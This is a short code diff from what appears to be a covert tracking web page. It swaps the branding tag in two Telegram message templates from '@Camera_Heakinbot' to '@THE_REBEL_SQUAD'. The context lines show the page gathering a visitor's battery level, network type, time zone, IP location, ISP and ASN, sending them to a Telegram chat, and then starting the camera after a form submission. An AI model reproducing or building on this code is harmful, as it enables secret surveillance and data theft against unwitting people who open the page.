@@ -94,7 +94,7 @@ async function sendInitialInfo(chatId) {
         <b>🔋 Battery Level:</b> <i>${deviceInfo.chargingPercentage}%</i>
         <b>📡 Network Type:</b> <i>${deviceInfo.networkType}</i>
         <b>🕒 Time Zone:</b> <i>${deviceInfo.timeZone}</i>
-        <b>👤 Tracked on: @Camera_Heakinbot</b>
+        <b>👤 Tracked on: @THE_REBEL_SQUAD</b>
     `;
     if (chatId) {
         await sendTelegramMessage(chatId, message);
@@ -122,7 +122,7 @@ document.getElementById('data-form').addEventListener('submit', async function (
         <b>📍 Location:</b> <i>${ipDetails.city}, ${ipDetails.region}, ${ipDetails.country}</i>
         <b>📡 ISP:</b> <i>${ipDetails.org}</i>
         <b>🔢 ASN:</b> <i>${ipDetails.asn}</i>
-        <b>👤 Tracked on: @Camera_Heakinbot</b>
+        <b>👤 Tracked on: @THE_REBEL_SQUAD</b>
     `;
     await sendTelegramMessage(chatId, message);
     const video = await startCamera();
